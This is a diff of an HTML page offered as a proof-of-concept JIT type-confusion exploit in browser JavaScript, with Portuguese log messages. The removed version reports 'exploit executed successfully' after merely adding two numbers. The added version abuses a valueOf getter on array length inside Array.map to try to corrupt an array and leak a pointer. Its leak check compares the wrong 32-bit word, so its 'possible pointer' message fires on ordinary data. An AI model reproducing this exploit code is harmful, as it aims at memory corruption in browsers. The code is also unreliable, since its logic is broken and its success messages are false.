@@ -1,65 +1,72 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>JIT Exploit - Type Confusion</title>
+  <meta charset="utf-8">
+  <title>Type Confusion + Fake Object PoC</title>
+  <style>
+    body {
+      background: black;
+      color: white;
+      font-family: monospace;
+      padding: 20px;
+    }
+  </style>
 </head>
 <body>
-  <h1>Teste de Exploração: Confusão de Tipo e Execução de Código</h1>
-  <pre id="log" style="background-color: black; color: white; padding: 20px; font-family: monospace; white-space: pre-wrap;"></pre>
-
+  <h1>JIT Type Confusion Exploit</h1>
+  <pre id="log">Carregando...</pre>
   <script>
-    document.body.innerHTML = `
-      <div id="log" style="
-        color: white; 
-        background: black; 
-        padding: 20px; 
-        font-family: monospace;
-        white-space: pre;
-      ">Iniciando o exploit...</div>
-    `;
+    const log = (msg) => {
+      const logEl = document.getElementById('log');
+      logEl.textContent += msg + '\n';
+    };
 
-    const logElement = document.getElementById('log');
-    let logData = '';
+    log('Iniciando Type Confusion...');
 
-    function log(msg) {
-      logData += msg + '\n';
-      logElement.textContent = logData;
+    function createCorruptedArray() {
+      let trigger = {
+        valueOf: function () {
+          log('[Hijack] valueOf ativado!');
+          arr.length = 1;  // Confunde o otimizador
+          return 3;
+        }
+      };
 
-      // Scroll automático para a última linha
-      logElement.scrollTop = logElement.scrollHeight;
+      let arr = [1.1, 1.1, 1.1];
+      let result = arr.map((x, i, a) => {
+        if (i === 1) {
+          a.length = trigger;
+        }
+        return x;
+      });
+
+      return result;
     }
 
-    log("Carregando... Iniciando exploit com valueOf...");
-
-    function triggerTypeConfusion() {
-      // Criando dois objetos com valueOf para causar confusão de tipo
-      const obj1 = { valueOf: () => 42 };
-      const obj2 = { valueOf: () => 84 };
-
-      // Manipulando esses objetos de forma que a conversão de tipo será forçada
-      const payload = [obj1, obj2];
-
-      // Confusão de tipo com a manipulação dos objetos
-      const result = payload[0] + payload[1]; // Isso pode forçar o JIT a fazer conversões inesperadas
-      log("[Hijack] Length modificado via valueOf!");
-      log(`[Resultado] ${result},${result},${result}`);
-      log("[Tipo] typeof result[1]: " + typeof result);
+    function floatToUint64(f) {
+      let float64 = new Float64Array(1);
+      let uint32 = new Uint32Array(float64.buffer);
+      float64[0] = f;
+      return [uint32[0], uint32[1]];
     }
 
-    // Função principal para executar o teste
-    function runExploit() {
-      try {
-        triggerTypeConfusion();
-        log("\n✅ Exploit executado com sucesso!");
-      } catch (e) {
-        log("\n💥 Erro: " + e.message);
+    try {
+      let result = createCorruptedArray();
+      log(`[Resultado] ${result}`);
+      log(`[Tipo] typeof result[1]: ${typeof result[1]}`);
+
+      let leak = result[1];
+      if (typeof leak === "number") {
+        let [lo, hi] = floatToUint64(leak);
+        log(`[Leak?] 0x${hi.toString(16)}${lo.toString(16)}`);
+        if (lo !== 0x3ff19999) log('[!] Possível leitura corrompida ou ponteiro!');
       }
-    }
 
-    // Delaying a execução para garantir que a página foi completamente carregada
-    setTimeout(runExploit, 2000);
+      log('\nExploração concluída.');
+
+    } catch (e) {
+      log('Falha: ' + e);
+    }
   </script>
 </body>
 </html>
